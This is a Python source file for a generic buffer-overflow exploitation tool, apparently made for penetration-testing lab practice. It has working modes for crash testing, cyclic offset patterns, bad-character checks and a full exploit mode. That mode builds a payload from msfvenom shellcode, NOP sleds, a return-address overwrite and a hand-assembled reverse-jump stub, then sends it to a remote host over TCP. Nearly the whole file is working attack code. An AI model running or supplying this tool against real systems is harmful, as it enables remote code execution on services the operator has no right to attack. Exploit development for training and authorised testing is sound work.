#!/usr/bin/python3
#
# ig_buffer_overflow.py
#
# Isabelle's generic buffer overflow tool
#

import sys
import socket
import binascii

VERBOSE = True

# Script usage
def printUsage(scriptName):
	print("Usages:")
	print("")
	print("test - Sends simple string (AAAAA) with buffer size and buffer head for memory test")
	print(" {} test remoteHost remotePort buffSize buffHead".format(scriptName))
	print(" {} test 10.2.31.155 2050 4096 'cmd2 /.:/'".format(scriptName))
	print("")

	print("cyclic - Sends cyclic string to help identify memory positions")
	print(" {} cyclic remoteHost remotePort buffSize buffHead".format(scriptName))
	print(" {} cyclic 10.2.31.155 2050 4096 'cmd2 /.:/'".format(scriptName))
	print("")

	print("write - Writes hex value to buffer offset")
	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent".format(scriptName))
	print(" {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809".format(scriptName))
	print("")

	print("write - Write badchars (before or after offset content) for badchar verification")
	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent badAfter excludeChars".format(scriptName))
	print(" {} write remoteHost remotePort buffSize buffHead offset hexcontent badBefore reverseJmpSize excludeChars".format(scriptName))
	print(" Example: Vanilla Buffer Overflow: {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809 badAfter '000a'".format(scriptName))
	print(" Example: SEH Overwrite: {} write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 0A62F809 badBefore 800 '00'".format(scriptName))
	print("")

	print("exploit - Sends malicious payload via buffer overflow")
	print(" {} exploit remoteHost remotePort buffSize buffHead offset hexcontent reverseJmpSize shellCodeFile [nops]".format(scriptName))
	print(" {} exploit 10.2.31.155 2048 5009 hello 01010101 1203 10 payload".format(scriptName))
	print("")

	print("Parameters:")
	print("")
	print(" [mode]		: Script modes: test|cyclic|write|exploit")
	print(" remoteHost	: Remote host IP.")
	print(" remotePort	: Remote host port.")
	print(" buffSize	: Amount of variable bytes to send.")
	print(" buffHead	: Static buffer string set at the beginning of the buffer.")
	print("		 Is usually the crash string. Size is considered in buffSize calc.")
	print(" offset		: Place in buffer where content can be added.")
	print(" hexcontent	: Hex string to add at the offset position.")
	print("		Can be considered as big endian (default) or little endian (will be reversed).")
	print("		Use 'g' or 'l' to delimit the order. Examples:")
	print("		'g01020304l05060708' --> will send '0102030408070605'")
	print("		'01020304' --> will send '01020304'")
	print(" bad*		: Adds bad chars before [badBefore] or after [badAfter] the content. Used for bad char testing.")
	print(" excludeChars	: List of chars (formatted as hex string) to be excluded from badchar list.")
	print(" reverseJmpSize	: Size in bytes to jump before the content to inject bad chars or the shell code.")
	print(" shellCodeFile	: Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.")
	print("		Example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o shellCodeFile")
	print(" nops		: Amount of nops to add before and after the shell code. Default is 0.")


# Auxiliary functions ###################################################################
#########################################################################################

# Creates cyclic pattern
# Adapted from: https://github.com/ickerwx/pattern/blob/master/pattern
def create_cyclic_pattern(length = 8192):
	pattern = ''
	parts = ['A', 'a', '0']

	while len(pattern) != length:
		pattern += parts[len(pattern) % 3]
		if len(pattern) % 3 == 0:
			parts[2] = chr(ord(parts[2]) + 1)
			if parts[2] > '9':
				parts[2] = '0'
				parts[1] = chr(ord(parts[1]) + 1)
				if parts[1] > 'z':
					parts[1] = 'a'
					parts[0] = chr(ord(parts[0]) + 1)
					if parts[0] > 'Z':
						parts[0] = 'A'
	
	print("Cyclic pattern:", pattern) if VERBOSE else None

	return pattern

# Checks if hex string value is valid
def is_valid_hex(content, size):
	if len(content) % 2 != 0:
		return False

	# Check if it is valid hex value
	try:
		intVal = int(content, 16) 
	except:
		return False

	if size == 0 or len(content) == size:
		return True
	
	return False

# Creates bad char string
# Example: create_bad_chars(0,'000a')
# Adapted from: https://gist.github.com/rverton/64589ac9f5c035100ab40501b17cdf63
def create_bad_chars(start, excludeChars):
	if excludeChars and not is_valid_hex(excludeChars, 0):
		print("Error: excludeChars is not a valid hex string")
		sys.exit(1);


	hexChars = [excludeChars[i:i+2] for i in range(0, len(excludeChars), 2)]
	exclude = [int(i, 16) for i in hexChars]

	print("Excluded bad chars:", hexChars) if VERBOSE else None

	badChars = ""

	for nr in range(start,255+1):
		if nr in exclude:
			continue
		badChars = badChars + '{:02x}'.format(nr)

	return binascii.unhexlify(badChars)

# Reverses hex string
def hex_reverse(values):
	reverseVal = ""
	for val in values:
		reverseVal = reverseVal + "".join(reversed([val[i:i+2] for i in range(0, len(val), 2)]))

	return reverseVal

# Gets binary content
# ./ig_buffer_overflow.py write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 l0102030405g0607080910l1122l44
def get_binary_content(writeContent):
	if not is_valid_hex(writeContent.replace("g", "").replace("l", ""), 0):
		print("Error: hexcontent is not a valid hex string")
		sys.exit(1);

	finalContent = ""

	gSplit = writeContent.split("g")
	for content in gSplit:
		if "l" in content:
			lSplit =  content.split("l")
			finalContent = finalContent + lSplit[0] + hex_reverse(lSplit[1:])
		else:
			finalContent = finalContent + content
				
	print("Binary content:", finalContent) if VERBOSE else None

	return binascii.unhexlify(finalContent)

# Creates backwards jmp instruction
# So as not to depend on external asm compilers or opcode generators, the following long jump code can only jump numbers divisible by 256. The following assembly code is used to jmp backwards (ref.: phrack #62 article 7, Aaron Adams):
#	fldz     		; D9EE
#	fnstenv [esp-12]  	; D97424F4
#	pop ecx    		; 59
#	add cl,10   		; 80C10A
#	nop     		; 90
#	dec ch    		; FECD (repeated to add 256*mult jmp size)
#	jmp ecx    		; FFE1  
def create_reverve_jmp(mult):
	head = "D9EED97424F45980C10A90"
	tail = "FFE1"
	jmp=""

	for i in range(0, int(mult)):
		jmp = jmp + "FECD"

	jmpCmd = head + jmp + tail

	print("Reverse jmp:", jmpCmd) if VERBOSE else None

	return binascii.unhexlify(jmpCmd)

# Create payload functions ##############################################################
#########################################################################################

# test
def create_test_payload(buffHead, buffSize):
	buff = b'A' * buffSize
	payload = buffHead + buff

	return payload

# cyclic
def create_cyclic_payload(buffHead, buffSize):
	cyclicPattern = create_cyclic_pattern(buffSize)
	payload = buffHead + cyclicPattern.encode()

	return payload

# write
def create_write_payload(buffHead, buffSize, offsetCount, binContent):
	# offset
	offset = b'A' * int(offsetCount)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(binContent))

	# payload
	payload = buffHead + offset + binContent + tail

	return payload

# write bad chars before content
def create_badchar_payload_before(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, excludeChars=""):
	# badchars
	badChars = create_bad_chars(0, excludeChars)

	# offset
	offset = b'A' * (offsetCount - len(badChars))

	# Limitation: reverse jump can only be divisible by 256
	tJmp = reverseJmpSize % 256

	if tJmp == 0:
		# tail
		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent))
		
		# payload
		payload = buffHead + offset + badChars + binContent + tail		
	else:
		reverseJmp = create_reverve_jmp(tJmp)

		# tail
		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent) - len(reverseJmp))
		
		# payload
		payload = buffHead + offset + badChars + binContent + reverseJmp + tail


	return payload

# write bad chars after content
def create_badchar_payload_after(buffHead, buffSize, offsetCount, binContent, excludeChars=""):
	# offset
	offset = b'A' * int(offsetCount)

	# badchars
	badChars = create_bad_chars(0, excludeChars)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(binContent) - len(badChars))

	# payload
	payload = buffHead + offset + binContent + badChars + tail

	return payload

# exploit
def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize = 2):
	# nops
	nops = b'\x90' * nopsSize

	# shellcode
	shellCodeFile = sys.argv[9]
	shellCodeModule = __import__(shellCodeFile)
	shellCode = shellCodeModule.payload	

	# Limitation: reverse jump can only be divisible by 256
	tJmp = reverseJmpSize % 256

	if tJmp == 0:
		# offset
		offset = b'A' * int(offsetCount)

		# tail
		tail = b'C' * (buffSize - len(offset) - len(binContent) - len(nops) - len(shellCode) - len(nops))

		# payload
		payload = buffHead + offset + binContent + nops + shellCode + nops + tail

	else:
		# offset	
		offset = b'A' * (int(offsetCount) - len(shellCode))

		reverseJmp = create_reverve_jmp(tJmp)

		# tail
		tail = b'Z' * (buffSize - len(offset) - len(nops) - len(shellCode) - len(nops) - len(binContent) - len(reverseJmp))

		# payload
		payload = buffHead + offset + nops + shellCode + nops + binContent + reverseJmp + tail

	return payload

		


# Main execution block ##################################################################
#########################################################################################

if __name__ == "__main__":
	DEFAULT_SOCKET_BUFF_SIZE = 1024
	scriptName = sys.argv[0]

	if (len(sys.argv) < 5) :
		printUsage(scriptName)
		sys.exit(1)	

	# Avaiable modes
	AVAILABLE_MODES = ['test', 'cyclic', 'write', 'exploit']
	mode = sys.argv[1]

	if mode not in AVAILABLE_MODES:
		print("Error: incorrect mode selected")
		printUsage(scriptName)
		sys.exit(1);

	# Check mode params
	if mode == 'write' and len(sys.argv) < 8:
		print("Error: incorrect number of params")
		printUsage(scriptName)
		sys.exit(1);

	if mode == 'exploit' and len(sys.argv) != 11:
		print("Error: incorrect number of params")	
		printUsage(scriptName)
		sys.exit(1);

	#print("Script arguments: ", sys.argv) if VERBOSE else None

	# Set input parameteres
	rhost = sys.argv[2]
	rport = int(sys.argv[3])
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)

	# Verify mode and create payload
	buffPayload = ""
	if mode == 'test':
		buffPayload = create_test_payload(buffHead, buffSize)

	elif mode == 'cyclic':
		buffPayload = create_cyclic_payload(buffHead, buffSize)

	elif mode == 'write':
		offset = int(sys.argv[6])
		writeContent = sys.argv[7]
		binContent = get_binary_content(writeContent)

		if len(sys.argv) > 8:
			badCharOption = sys.argv[8]

			if badCharOption == 'badBefore':
				if (len(sys.argv) <= 9):
					print("Error: incorrect number of params.")
					sys.exit(1);

				reverseJmpSize = int(sys.argv[9])
				excludedChars = sys.argv[10] if len(sys.argv) > 10 else ""

				buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, excludedChars)

			elif badCharOption == 'badAfter':
				excludedChars = sys.argv[9] if len(sys.argv) > 9 else ""

				buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, excludedChars)
				
			else:
				print("Error: incorrect badchar option. Can only be 'badBefore' or 'badAfter'")
				sys.exit(1);
		else:
			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)


	elif mode == 'exploit':
		offset = int(sys.argv[6])
		writeContent = sys.argv[7]
		binContent = get_binary_content(writeContent)

		reverseJmpSize = int(sys.argv[8])
		shellCodeFile = sys.argv[9]
		nops = int(sys.argv[10]) if len(sys.argv) > 10 else 0

		buffPayload = create_exploit_payload(buffHead, buffSize, offset, binContent, reverseJmpSize, shellCodeFile, nops)
	else:
		printUsage(scriptName)
		sys.exit(1);


	print("") if VERBOSE else None

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connect to rhost and rport
		connect = s.connect((rhost, rport))

		print("Started socket communication") if VERBOSE else None

		# Application connection return
		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
		print(r) if VERBOSE else None

		# Send payload
		print("") if VERBOSE else None
		print("Sending payload with size {}".format(len(buffPayload))) if VERBOSE else None
		print(buffPayload) if VERBOSE else None
		print("") if VERBOSE else None

		s.send(buffPayload)

		# Application payload return
		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)

		print("Payload return") if VERBOSE else None
		print(r) if VERBOSE else None

	except KeyboardInterrupt:
		print("Keyboard Interrupt. Exiting.")
	except:
		print("Unexpected error:", sys.exc_info()[0])
		raise
	finally:
		s.close()

